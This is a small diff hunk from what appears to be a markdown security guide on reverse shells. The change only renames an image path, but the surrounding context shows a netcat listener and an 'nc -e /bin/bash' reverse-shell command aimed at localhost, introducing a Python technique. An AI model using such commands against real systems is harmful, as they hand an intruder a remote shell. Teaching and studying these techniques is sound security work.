@@ -22,7 +22,7 @@ nc -nlvp 80
 nc -e /bin/bash 127.0.0.1 80
 ```
 
-<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 First technique with python:
 
